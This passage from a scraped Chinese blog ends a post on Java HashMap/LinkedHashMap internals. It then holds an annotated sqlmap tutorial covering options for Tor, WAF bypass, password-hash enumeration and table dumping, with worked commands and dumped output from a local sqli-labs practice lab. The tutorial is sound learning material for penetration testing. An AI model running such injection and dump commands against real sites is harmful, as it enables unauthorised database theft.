HashMap总结注意</h6><p>在散列表中有装载因子这么一个属性，当装载因子*初始容量小于散列表元素时，该散列表会再散列，扩容2倍！<br></p>\n<p>装载因子的默认值是0.75，无论是初始大了还是初始小了对我们HashMap的性能都不好<br></p>\n<ul>\n<li>装载因子初始值大了，可以减少散列表再散列(扩容的次数)，但同时会导致散列冲突的可能性变大(散列冲突也是耗性能的一个操作，要得操作链表(红黑树)！</li>\n<li>装载因子初始值小了，可以减小散列冲突的可能性，但同时扩容的次数可能就会变多！</li>\n</ul>\n<p>初始容量的默认值是16，它也一样，无论初始大了还是小了，对我们的HashMap都是有影响的：<br></p>\n<ul>\n<li>初始容量过大，那么遍历时我们的速度就会受影响~</li>\n<li>初始容量过小，散列表再散列(扩容的次数)可能就变得多，扩容也是一件非常耗费性能的一件事~</li>\n</ul>\n<p>从源码上我们可以发现：HashMap并不是直接拿key的哈希值来用的，它会将key的哈希值的高16位进行异或操作，使得我们将元素放入哈希表的时候增加了一定的随机性。<br></p>\n<p>还要值得注意的是：并不是桶子上有8位元素的时候它就能变成红黑树，它得同时满足我们的散列表容量大于64才行的<br></p>\n<h6 id=\"1-3-8-HashTable\"><a href=\"#1-3-8-HashTable\" class=\"headerlink\" title=\"1.3.8 HashTable\"></a>1.3.8 HashTable</h6><p>从存储结构和实现来讲基本上都是相同的。它和HashMap的最大的不同是它是线程安全的，另外它不允许key和value为null。Hashtable是个过时的集合类，不建议在新代码中使用，不需要线程安全的场合可以用HashMap替换，需要线程安全的场合可以用ConcurrentHashMap替换<br></p>\n<h4 id=\"2-LinkendHashMap\"><a href=\"#2-LinkendHashMap\" class=\"headerlink\" title=\"2.LinkendHashMap\"></a>2.LinkendHashMap</h4><p>LinkendHashMap 底层为 HashMap 和一个双向链表，保证了存储数据的有序.<br></p>\n<h5 id=\"2-1-内部节点类\"><a href=\"#2-1-内部节点类\" class=\"headerlink\" title=\"2.1 内部节点类\"></a>2.1 内部节点类</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static class Entry&lt;K,V&gt; extends HashMap.Node&lt;K,V&gt; &#123;</span><br><span class=\"line\">    Entry&lt;K,V&gt; before, after;</span><br><span class=\"line\">    Entry(int hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class=\"line\">        super(hash, key, value, next);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * The head (eldest) of the doubly linked list.</span><br><span class=\"line\"> */</span><br><span class=\"line\">transient LinkedHashMap.Entry&lt;K,V&gt; head;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * The tail (youngest) of the doubly linked list.</span><br><span class=\"line\"> */</span><br><span class=\"line\">transient LinkedHashMap.Entry&lt;K,V&gt; tail;</span><br></pre></td></tr></table></figure>\n<p>可以看出，是在HashMap的节点上，添加了before/after的一个双向链表.<br></p>\n<h4 id=\"2-2-accessOrder\"><a href=\"#2-2-accessOrder\" class=\"headerlink\" title=\"2.2 accessOrder\"></a>2.2 accessOrder</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * The iteration ordering method for this linked hash map: &lt;tt&gt;true&lt;/tt&gt;</span><br><span class=\"line\"> * for access-order, &lt;tt&gt;false&lt;/tt&gt; for insertion-order.</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @serial</span><br><span class=\"line\"> */</span><br><span class=\"line\">final boolean accessOrder;</span><br><span class=\"line\"></span><br><span class=\"line\">//带accessOrder的构造方法， 不带该参数时，默认为false</span><br><span class=\"line\">public LinkedHashMap(int initialCapacity,</span><br><span class=\"line\">                     float loadFactor,</span><br><span class=\"line\">                     boolean accessOrder) &#123;</span><br><span class=\"line\">    super(initialCapacity, loadFactor);</span><br><span class=\"line\">    this.accessOrder = accessOrder;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>LinkedHashMap 是有序的， accessOrder 可以控制其排序方式.<br></p>\n<ul>\n<li>true</li>\n</ul>\n<p>基于访问排序（使用 LRU 最近最少使用算法)</p>\n<ul>\n<li>false</li>\n</ul>\n<p>基于插入排序</p>\n<h4 id=\"2-3-重写HashMap方法\"><a href=\"#2-3-重写HashMap方法\" class=\"headerlink\" title=\"2.3 重写HashMap方法\"></a>2.3 重写HashMap方法</h4><p>因为在HashMap的基础上，添加了双向链表，所以得重写HashMap 的部分方法<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.初始化散列表时，也初始化双向链表</span><br><span class=\"line\">void reinitialize() &#123;</span><br><span class=\"line\">    super.reinitialize();</span><br><span class=\"line\">    head = tail = null;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//2.创建entry时，将entry加入双向链表的末尾</span><br><span class=\"line\">//可以看出，新节点不再是 Node 而是 Entry</span><br><span class=\"line\">Node&lt;K,V&gt; newNode(int hash, K key, V value, Node&lt;K,V&gt; e) &#123;</span><br><span class=\"line\">    LinkedHashMap.Entry&lt;K,V&gt; p =</span><br><span class=\"line\">        new LinkedHashMap.Entry&lt;K,V&gt;(hash, key, value, e);</span><br><span class=\"line\">    linkNodeLast(p);</span><br><span class=\"line\">    return p;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private void linkNodeLast(LinkedHashMap.Entry&lt;K,V&gt; p) &#123;</span><br><span class=\"line\">   LinkedHashMap.Entry&lt;K,V&gt; last = tail;</span><br><span class=\"line\">   tail = p;</span><br><span class=\"line\">   if (last == null)</span><br><span class=\"line\">       head = p;</span><br><span class=\"line\">   else &#123;</span><br><span class=\"line\">       p.before = last;</span><br><span class=\"line\">       last.after = p;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里只是举了两个例子，其它还有很多方式也类似的重写，添上对双向链表的操作。<br></p>\n<h4 id=\"2-4-构造方法\"><a href=\"#2-4-构造方法\" class=\"headerlink\" title=\"2.4 构造方法\"></a>2.4 构造方法</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public LinkedHashMap(int initialCapacity, float loadFactor) &#123;</span><br><span class=\"line\">   super(initialCapacity, loadFactor);</span><br><span class=\"line\">   accessOrder = false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public LinkedHashMap(int initialCapacity) &#123;</span><br><span class=\"line\">   super(initialCapacity);</span><br><span class=\"line\">   accessOrder = false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public LinkedHashMap() &#123;</span><br><span class=\"line\">   super();</span><br><span class=\"line\">   accessOrder = false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public LinkedHashMap(Map&lt;? extends K, ? extends V&gt; m) &#123;</span><br><span class=\"line\">    super();</span><br><span class=\"line\">    accessOrder = false;</span><br><span class=\"line\">    putMapEntries(m, false);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public LinkedHashMap(int initialCapacity, float loadFactor,   boolean accessOrder) &#123;</span><br><span class=\"line\">   super(initialCapacity, loadFactor);</span><br><span class=\"line\">   this.accessOrder = accessOrder;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-5-get\"><a href=\"#2-5-get\" class=\"headerlink\" title=\"2.5  get()\"></a>2.5  get()</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public V get(Object key) &#123;</span><br><span class=\"line\">   Node&lt;K,V&gt; e;</span><br><span class=\"line\">   if ((e = getNode(hash(key), key)) == null)</span><br><span class=\"line\">       return null;</span><br><span class=\"line\">   if (accessOrder)</span><br><span class=\"line\">       afterNodeAccess(e);</span><br><span class=\"line\">   return e.value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void afterNodeAccess(Node&lt;K,V&gt; e) &#123; // move node to last</span><br><span class=\"line\">    LinkedHashMap.Entry&lt;K,V&gt; last;</span><br><span class=\"line\">    if (accessOrder &amp;&amp; (last = tail) != e) &#123;</span><br><span class=\"line\">        LinkedHashMap.Entry&lt;K,V&gt; p =</span><br><span class=\"line\">            (LinkedHashMap.Entry&lt;K,V&gt;)e, b = p.before, a = p.after;</span><br><span class=\"line\">        p.after = null;</span><br><span class=\"line\">        if (b == null)</span><br><span class=\"line\">            head = a;</span><br><span class=\"line\">        else</span><br><span class=\"line\">            b.after = a;</span><br><span class=\"line\">        if (a != null)</span><br><span class=\"line\">            a.before = b;</span><br><span class=\"line\">        else</span><br><span class=\"line\">            last = b;</span><br><span class=\"line\">        if (last == null)</span><br><span class=\"line\">            head = p;</span><br><span class=\"line\">        else &#123;</span><br><span class=\"line\">            p.before = last;</span><br><span class=\"line\">            last.after = p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        tail = p;</span><br><span class=\"line\">        ++modCount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在 accessOder的情况下， 每次 get 后  会将该元素放到双向链表最后</p>\n"},{"title":"sqlmap","date":"2018-08-28T19:30:54.000Z","_content":"使用sqlmap需要自己先找到注入点\n## 1.sqlmap 用户文档\n用户文档来自 https://blog.csdn.net/u012763794/article/details/52638931</br>\n-v VERBOSE 输出信息的详细程度\n\t# Verbosity level.\n\t# Valid: integer between 0 and 6\n\t# 0: Show only error and critical messages  只显示错误和关键信息\n\t# 1: Show also warning and info messages    警告和信息\n\t# 2: Show also debug messages               调试信息\n\t# 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)',(..)\"(\"\n\t# 4: Show also HTTP requests                整个GET报文都看到了\n\t# 5: Show also HTTP responses' headers         返回报文的头部\n\t# 6: Show also HTTP responses' page content    返回的html代码都有了\n\t# Default: 1\n Request: 请求\n\tThese options can be used to specify how to connect to the target URL\n\n\t--method=METHOD     Force usage of given HTTP method (e.g. PUT)\n\t\t指定HTTP请求的方法，GET，POST，PUT，MOVE等\n\t--data=DATA         Data string to be sent through POST\n\t\t指定POST的参数\n\t--param-del=PARA..  Character used for splitting parameter values\n\t\t这个拆分一些参数的，如下面用;拆分post参数\n\t\tpython sqlmap.py -u \"http://www.target.com/vuln.php\" --data=\"query=foobar;id=1\" --param-del=\";\" -f --banner --dbs --users\n\t--cookie=COOKIE     HTTP Cookie header value\n\t\t指定cookie值\n\t--cookie-del=COO..  Character used for splitting cookie values\n\t\t指定分割cookie值的字符是什么\n\t--load-cookies=L..  File containing cookies in Netscape/wget format\n\t\t这个是从文件中读取cookie吧，Netscape/wget格式的\n\t--drop-set-cookie   Ignore Set-Cookie header from response\n\t\t忽略响应包的Set-Cookie头\n\t--user-agent=AGENT  HTTP User-Agent header value\n\t\t指定User-Agent用户代理\n\t--random-agent      Use randomly selected HTTP User-Agent header value\n\t\t随机选用sqlmap目录中的User-Agent，这个文件再txt目录\n\t--host=HOST         HTTP Host header value\n\t\t指定主机头\n\t--referer=REFERER   HTTP Referer header value\n\t\t指定Referer头，就是请求来源的意思\n\t-H HEADER, --hea..  Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")\n\t\t指定某个头部，如： -H \"X-Forwarded-For: 127.0.0.1\"\n\t--headers=HEADERS   Extra headers (e.g. \"Accept-Language: fr\\nETag: 123\")\n\t\t这个的话应该是可以指定多个，用\\n分割\n\t--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)\n\t\t指定http认证类型\n\t--auth-cred=AUTH..  HTTP authentication credentials (name:password)\n\t\t指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证\n\t--auth-file=AUTH..  HTTP authentication PEM cert/private key file\n\t\t指定一个私钥文件来认证\n\t--ignore-401        Ignore HTTP Error 401 (Unauthorized)\n\t\t忽略401错误\n\t--proxy=PROXY       Use a proxy to connect to the target URL\n\t\t指定代理\n\t--proxy-cred=PRO..  Proxy authentication credentials (name:password)\n\t\t指定代理的认证信息，就是账号密码\n\t--proxy-file=PRO..  Load proxy list from a file\n\t\t从文件中选择代理\n\t--ignore-proxy      Ignore system default proxy settings\n\t\t忽略系统默认代理\n\t--tor               Use Tor anonymity network\n\t\t使用tor网络\n\t--tor-port=TORPORT  Set Tor proxy port other than default\n\t\t设置tor的端口，如果不是默认端口的话\n\t--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))\n\t\t设置tor代理的类型\n\t--check-tor         Check to see if Tor is used properly\n\t\t检测tor能不能用\n\t--delay=DELAY       Delay in seconds between each HTTP request\n\t\t设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过\n\t--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)\n\t\t设置超时时间，默认30秒\n\t--retries=RETRIES   Retries when the connection timeouts (default 3)\n\t\t设置重试的次数，默认3次\n\t--randomize=RPARAM  Randomly change value for given parameter(s)\n\t\t随机地更改给定参数的值\n\t--safe-url=SAFEURL  URL address to visit frequently during testing\n\t\t有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求\n\t\t这里提供一个安全不错误的连接，每隔一段时间都会去访问一下\n\t--safe-post=SAFE..  POST data to send to a safe URL\n\t\t这里设置一个正确的post数据\n\t--safe-req=SAFER..  Load safe HTTP request from a file\n\t\t从文件中读取安全，或者叫正确的http请求\n\t--safe-freq=SAFE..  Test requests between two visits to a given safe URL\n\t\t设置访问安全url的时间间隔\n\t--skip-urlencode    Skip URL encoding of payload data\n\t\t不进行url编码\n\t--csrf-token=CSR..  Parameter used to hold anti-CSRF token\n\t\t设置CSRF的token\n\t--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token\n\n\t--force-ssl         Force usage of SSL/HTTPS\n\t\t强制使用https\n\t--hpp               Use HTTP parameter pollution method\n\t\t尝试了一下，只能用于ASP，得到报错信息如下：\n\t\t[WARNING] HTTP parameter pollution should work only against ASP(.NET) targets\n\n\t--eval=EVALCODE     Evaluate provided Python code before the request (e.g.\n\t\t\t\t\t\t\"import hashlib;id2=hashlib.md5(id).hexdigest()\")\n\t\t发送请求之前，先运行这段python代码，比如对某个参数进行处理\n\t\t比如下面的，hash参数就是id的md5值\n\t\tpython sqlmap.py -u \"http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc\n    509a6f75849b\" --eval=\"import hashlib;hash=hashlib.md5(id).hexdigest()\"\n\nFingerprint:</br>\n-f, --fingerprint   Perform an extensive DBMS version fingerprint\n\t这个应该是数据库指纹识别，加了可能识别更好</br>\n\nEnumeration:</br>\nThese options can be used to enumerate the back-end database\nmanagement system information, structure and data contained in the\ntables. Moreover you can run your own SQL statements</br>\n-a, --all           Retrieve everything</br>\n\t检索所有，这是拖库的节奏啊</br>\n-b, --banner        Retrieve DBMS banner</br>\n\t检索数据库的一些标志性的信息，就是指纹这样子吧</br>\n--current-user      Retrieve DBMS current user</br>\n\t检索当前连接数据库的用户</br>\n--current-db        Retrieve DBMS current database</br>\n\t检索当前连接的数据库</br>\n--hostname          Retrieve DBMS server hostname</br\n\t检索服务器的主机名</br>\n--is-dba            Detect if the DBMS current user is DBA</br>\n\t检测是不是dba，就是root权限咯</br>\n--users             Enumerate DBMS users</br>\n\t枚举数据库用户</br>\n--passwords         Enumerate DBMS users password hashes</br>\n\t枚举数据库用户的哈希值</br>\n--privileges        Enumerate DBMS users privileges</br>\n\t枚举数据库用户的权限</br>\n--roles             Enumerate DBMS users roles</br>\n\t枚举数据库用户的角色</br>\n--dbs               Enumerate DBMS databases</br>\n\t枚举数据库有哪些</br>\n--tables            Enumerate DBMS database tables</br>\n\t枚举数据表名</br>\n--columns           Enumerate DBMS database table columns</br>\n\t枚举列名</br>\n--schema            Enumerate DBMS schema</br>\n\t这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举</br>\n--count             Retrieve number of entries for table(s)</br>\n\t枚举表格个数</br>\n--dump              Dump DBMS database table entries</br>\n\t输出数据库表的数据</br>\n--dump-all          Dump all DBMS databases tables entries</br>\n\t输出所有</br>\n--search            Search column(s), table(s) and/or database name(s)</br>\n\t查找特定的列名，表名或数据库名，配合下面的-D,-C,-T</br>\n--comments          Retrieve DBMS comments</br>\n\t枚举数据库的注释</br>\n-D DB               DBMS database to enumerate</br>\n\t指定数据库名</br>\n-T TBL              DBMS database table(s) to enumerate</br>\n\t指定表名</br>\n-C COL              DBMS database table column(s) to enumerate</br>\n\t指定列名</br>\n-X EXCLUDECOL       DBMS database table column(s) to not enumerate</br>\n\t指定不枚举那个列</br>\n-U USER             DBMS user to enumerate</br>\n\t枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数</br>\n--exclude-sysdbs    Exclude DBMS system databases when enumerating tables</br>\n\t枚举时排除系统的数据库</br>\n--pivot-column=P..  Pivot column name</br>\n\t以某一列为核心？这个用过没感觉出什么用</br>\n--where=DUMPWHERE   Use WHERE condition while table dumping</br>\n\t使用where调试限制table的输出</br>\n--start=LIMITSTART  First query output entry to retrieve</br>\n\t指定开始从第几行开始输出，如--start=3，前两行就不输出了</br>\n--stop=LIMITSTOP    Last query output entry to retrieve</br>\n\t指定从第几行开始停止输出</br>\n--first=FIRSTCHAR   First query output word character to retrieve</br>\n\t指定只输出第几个字符开始输出，盲注才有效，亲测</br>\n--last=LASTCHAR     Last query output word character to retrieve</br>\n\t指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，</br>\n\t如 ：--first 3 --last 5  只输出3到5位置的字符</br>\n--sql-query=QUERY   SQL statement to be executed</br>\n\t指定执行我们的sql语句</br>\n--sql-shell         Prompt for an interactive SQL shell</br>\n\t返回一个sql的shell</br>\n--sql-file=SQLFILE  Execute SQL statements from given file(s)</br>\n\t从文件中读取执行sql语句</br>\n\n## 二.实例\n\t1.sqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -b --is-dba --dbs\n\t查看指纹信息/是否dba(root权限)/数据库\n\tweb server operating system: Linux Ubuntu\n\tweb application technology: Apache 2.4.18\n\tback-end DBMS operating system: Linux Ubuntu\n\tback-end DBMS: MySQL 5.0\n\tbanner:    '5.7.23-0ubuntu0.16.04.1'\n\n\tcurrent user is DBA:    True\n\n\tavailable databases [6]:\n\t[*] challenges\n\t[*] information_schema\n\t[*] mysql\n\t[*] performance_schema\n\t[*] security\n\t[*] sys\n\n\t2.查看security下表名\n\t sqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -D security --tables\n\tDatabase: security\n\t[4 tables]\n\t+----------+\n\t| emails   |\n\t| referers |\n\t| uagents  |\n\t| users    |\n\t+----------+\n\n\t3.查看列名\n\tsqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -D security -T users --columns\n\n\tDatabase: security\n\tTable: users\n\t[3 columns]\n\t+----------+-------------+\n\t| Column   | Type        |\n\t+----------+-------------+\n\t| id       | int(3)      |\n\t| password | varchar(20) |\n\t| username | varchar(20) |\n\t+----------+-------------+\n\n\t4.获得所有username\n\tsqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -D security -T users -C username --dump\n\n\tDatabase: security\n\tTable: users\n\t[16 entries]\n\t+-----------+\n\t| username  |\n\t+-----------+\n\t| admin     |\n\t| admin#    |\n\t| admin'#   |\n\t| admin1    |\n\t| admin2    |\n\t| admin3    |\n\t| admin4    |\n\t| admin\\\\'# |\n\t| Angelina  |\n\t| batman    |\n\t| dhakkan   |\n\t| Dumb      |\n\t| Dummy     |\n\t| secure    |\n\t| stupid    |\n\t| superman  |\n\t+-----------+\n\n### 三.技巧等\n\t1.自动寻找注入点\n\tsqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-62/?id=1*\" --batch\n\t如上，在可能的注入点后，加上*，将会自动寻找注入\n\t可以加上 --level n（1-5） 参数，越高越全面\n\n\t2.绕过WAF\n\t--tamper=TAMPER 使用给定的脚本（S）篡改注入数据\n\n\t3.post注入\n\t--data \"id=1\"\n\t或 抓取post数据包，保存为txt, -r参数读取文件 -p 要注入的参数\n","source":"_posts/security/sql/sqlmap.md","raw":"---\ntitle: sqlmap\ndate: 2018-08-28 15:30:54\ntags: [security]\n---\n使用sqlmap需要自己先找到注入点\n## 1.sqlmap 用户文档\n用户文档来自 https://blog.csdn.net/u012763794/article/details/52638931</br>\n-v VERBOSE 输出信息的详细程度\n\t# Verbosity level.\n\t# Valid: integer between 0 and 6\n\t# 0: Show only error and critical messages  只显示错误和关键信息\n\t# 1: Show also warning and info messages    警告和信息\n\t# 2: Show also debug messages               调试信息\n\t# 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)',(..)\"(\"\n\t# 4: Show also HTTP requests                整个GET报文都看到了\n\t# 5: Show also HTTP responses' headers         返回报文的头部\n\t# 6: Show also HTTP responses' page content    返回的html代码都有了\n\t# Default: 1\n Request: 请求\n\tThese options can be used to specify how to connect to the target URL\n\n\t--method=METHOD     Force usage of given HTTP method (e.g. PUT)\n\t\t指定HTTP请求的方法，GET，POST，PUT，MOVE等\n\t--data=DATA         Data string to be sent through POST\n\t\t指定POST的参数\n\t--param-del=PARA..  Character used for splitting parameter values\n\t\t这个拆分一些参数的，如下面用;拆分post参数\n\t\tpython sqlmap.py -u \"http://www.target.com/vuln.php\" --data=\"query=foobar;id=1\" --param-del=\";\" -f --banner --dbs --users\n\t--cookie=COOKIE     HTTP Cookie header value\n\t\t指定cookie值\n\t--cookie-del=COO..  Character used for splitting cookie values\n\t\t指定分割cookie值的字符是什么\n\t--load-cookies=L..  File containing cookies in Netscape/wget format\n\t\t这个是从文件中读取cookie吧，Netscape/wget格式的\n\t--drop-set-cookie   Ignore Set-Cookie header from response\n\t\t忽略响应包的Set-Cookie头\n\t--user-agent=AGENT  HTTP User-Agent header value\n\t\t指定User-Agent用户代理\n\t--random-agent      Use randomly selected HTTP User-Agent header value\n\t\t随机选用sqlmap目录中的User-Agent，这个文件再txt目录\n\t--host=HOST         HTTP Host header value\n\t\t指定主机头\n\t--referer=REFERER   HTTP Referer header value\n\t\t指定Referer头，就是请求来源的意思\n\t-H HEADER, --hea..  Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")\n\t\t指定某个头部，如： -H \"X-Forwarded-For: 127.0.0.1\"\n\t--headers=HEADERS   Extra headers (e.g. \"Accept-Language: fr\\nETag: 123\")\n\t\t这个的话应该是可以指定多个，用\\n分割\n\t--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)\n\t\t指定http认证类型\n\t--auth-cred=AUTH..  HTTP authentication credentials (name:password)\n\t\t指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证\n\t--auth-file=AUTH..  HTTP authentication PEM cert/private key file\n\t\t指定一个私钥文件来认证\n\t--ignore-401        Ignore HTTP Error 401 (Unauthorized)\n\t\t忽略401错误\n\t--proxy=PROXY       Use a proxy to connect to the target URL\n\t\t指定代理\n\t--proxy-cred=PRO..  Proxy authentication credentials (name:password)\n\t\t指定代理的认证信息，就是账号密码\n\t--proxy-file=PRO..  Load proxy list from a file\n\t\t从文件中选择代理\n\t--ignore-proxy      Ignore system default proxy settings\n\t\t忽略系统默认代理\n\t--tor               Use Tor anonymity network\n\t\t使用tor网络\n\t--tor-port=TORPORT  Set Tor proxy port other than default\n\t\t设置tor的端口，如果不是默认端口的话\n\t--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))\n\t\t设置tor代理的类型\n\t--check-tor         Check to see if Tor is used properly\n\t\t检测tor能不能用\n\t--delay=DELAY       Delay in seconds between each HTTP request\n\t\t设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过\n\t--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)\n\t\t设置超时时间，默认30秒\n\t--retries=RETRIES   Retries when the connection timeouts (default 3)\n\t\t设置重试的次数，默认3次\n\t--randomize=RPARAM  Randomly change value for given parameter(s)\n\t\t随机地更改给定参数的值\n\t--safe-url=SAFEURL  URL address to visit frequently during testing\n\t\t有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求\n\t\t这里提供一个安全不错误的连接，每隔一段时间都会去访问一下\n\t--safe-post=SAFE..  POST data to send to a safe URL\n\t\t这里设置一个正确的post数据\n\t--safe-req=SAFER..  Load safe HTTP request from a file\n\t\t从文件中读取安全，或者叫正确的http请求\n\t--safe-freq=SAFE..  Test requests between two visits to a given safe URL\n\t\t设置访问安全url的时间间隔\n\t--skip-urlencode    Skip URL encoding of payload data\n\t\t不进行url编码\n\t--csrf-token=CSR..  Parameter used to hold anti-CSRF token\n\t\t设置CSRF的token\n\t--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token\n\n\t--force-ssl         Force usage of SSL/HTTPS\n\t\t强制使用https\n\t--hpp               Use HTTP parameter pollution method\n\t\t尝试了一下，只能用于ASP，得到报错信息如下：\n\t\t[WARNING] HTTP parameter pollution should work only against ASP(.NET) targets\n\n\t--eval=EVALCODE     Evaluate provided Python code before the request (e.g.\n\t\t\t\t\t\t\"import hashlib;id2=hashlib.md5(id).hexdigest()\")\n\t\t发送请求之前，先运行这段python代码，比如对某个参数进行处理\n\t\t比如下面的，hash参数就是id的md5值\n\t\tpython sqlmap.py -u \"http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc\n    509a6f75849b\" --eval=\"import hashlib;hash=hashlib.md5(id).hexdigest()\"\n\nFingerprint:</br>\n-f, --fingerprint   Perform an extensive DBMS version fingerprint\n\t这个应该是数据库指纹识别，加了可能识别更好</br>\n\nEnumeration:</br>\nThese options can be used to enumerate the back-end database\nmanagement system information, structure and data contained in the\ntables. Moreover you can run your own SQL statements</br>\n-a, --all           Retrieve everything</br>\n\t检索所有，这是拖库的节奏啊</br>\n-b, --banner        Retrieve DBMS banner</br>\n\t检索数据库的一些标志性的信息，就是指纹这样子吧</br>\n--current-user      Retrieve DBMS current user</br>\n\t检索当前连接数据库的用户</br>\n--current-db        Retrieve DBMS current database</br>\n\t检索当前连接的数据库</br>\n--hostname          Retrieve DBMS server 